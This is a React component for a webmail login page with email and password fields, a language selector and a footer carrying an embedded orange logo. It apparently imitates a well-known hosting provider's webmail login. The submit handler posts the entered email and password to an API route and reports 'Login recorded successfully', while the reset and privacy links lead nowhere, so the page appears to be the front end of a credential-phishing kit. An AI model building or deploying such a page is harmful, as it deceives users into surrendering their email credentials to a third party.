'use client';

import React, { useState } from 'react';
import { Mail, Lock, User } from 'lucide-react';
import { useLanguage } from '@/lib/language-context';
import { languages } from '@/lib/translations';
import { Button } from '@/components/ui/button';

export function WebmailLogin() {
  const { language, setLanguage, t } = useLanguage();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showAllLanguages, setShowAllLanguages] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMsg, setStatusMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setStatusMsg(null);

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setStatusMsg({ type: 'success', text: data.message || 'Login recorded successfully.' });
      } else {
        setStatusMsg({ type: 'error', text: data.error || 'Failed to connect. Please try again.' });
      }
    } catch (error) {
      console.error('Login error:', error);
      setStatusMsg({ type: 'error', text: 'An error occurred. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  const VISIBLE_COUNT = 7;
  const visibleLanguages = showAllLanguages ? languages : languages.slice(0, VISIBLE_COUNT);
  const hasMore = languages.length > VISIBLE_COUNT;

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 flex flex-col items-center px-4 py-8">

      {/* Centered content block — grows to push footer down */}
      <div className="flex flex-col items-center justify-center flex-1 w-full">

        {/* Logo */}
        <div className="text-center mb-6">
          <img src="/webmail-logo.svg" alt="Logo" className="h-12 w-auto mx-auto" />
        </div>

        {/* Form Container */}
        <div className="w-full max-w-sm p-8 space-y-6">
          <form onSubmit={handleLogin} className="space-y-5">
            {/* Email Field */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-[#293a4a]">
                {t('emailLabel')}
              </label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#bebebe] w-5 h-5" />
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder={t('emailPlaceholder')}
                  className="block w-full h-[32px] rounded border-2 border-[#bebebe] bg-white bg-no-repeat pl-10 pr-4 text-slate-900 focus:outline-none transition-colors placeholder-[#bebebe]"
                  required
                />
              </div>
            </div>

            {/* Password Field */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-[#293a4a]">
                {t('passwordLabel')}
              </label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#bebebe] w-5 h-5" />
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder={t('passwordPlaceholder')}
                  className="block w-full h-[32px] rounded border-2 border-[#bebebe] bg-white bg-no-repeat pl-10 pr-4 text-slate-900 focus:outline-none transition-colors placeholder-[#bebebe]"
                  required
                />
              </div>
            </div>

            {/* Login Button */}
            <Button
              type="submit"
              disabled={isLoading}
              className="w-full rounded-none bg-[#179bd7] hover:bg-[#1389bd] text-white text-[13px] font-['Open_Sans',sans-serif] font-semibold pt-[7px] pb-[7px] text-center no-underline transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Logging in...' : t('loginButton')}
            </Button>
          </form>

          {/* Status Message */}
          {statusMsg && (
            <div className={`text-center text-sm py-2 px-3 rounded ${
              statusMsg.type === 'success'
                ? 'bg-green-50 text-green-700 border border-green-200'
                : 'bg-red-50 text-red-700 border border-red-200'
            }`}>
              {statusMsg.text}
            </div>
          )}

          {/* Reset Password Link */}
          <div className="text-center">
            <button className="text-slate-700 font-semibold hover:text-orange-500 transition-colors">
              {t('resetPassword')}
            </button>
          </div>
        </div>

        {/* Language Selector — inline list */}
        <div className="mt-6 w-full max-w-2xl px-4">
          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-2">
            {visibleLanguages.map((lang) => (
              <button
                key={lang.code}
                onClick={() => setLanguage(lang.code)}
                className={`text-sm transition-colors ${language === lang.code
                    ? 'text-orange-500 font-semibold'
                    : 'text-slate-600 hover:text-slate-900'
                  }`}
              >
                {lang.label}
              </button>
            ))}
            {hasMore && (
              <button
                onClick={() => setShowAllLanguages((prev) => !prev)}
                className="text-sm text-slate-600 hover:text-slate-900 transition-colors"
              >
                {showAllLanguages ? '‹ less' : '...'}
              </button>
            )}
          </div>
        </div>

      </div>

      {/* Footer — pinned to bottom */}
      <footer className="mt-8 text-center text-sm text-slate-600 space-y-2">
        <div className="pt-2">
          <img src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC01LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS01LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS01LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=" alt="" className="h-4 w-auto mx-auto" />
        </div>
        <div>
          <p>{t('copyright')}</p>
        </div>
        <div>
          <a href="#" className="text-slate-600 hover:text-orange-500 transition-colors">
            {t('privacyPolicy')}
          </a>
        </div>
      </footer>
    </div>
  );
}
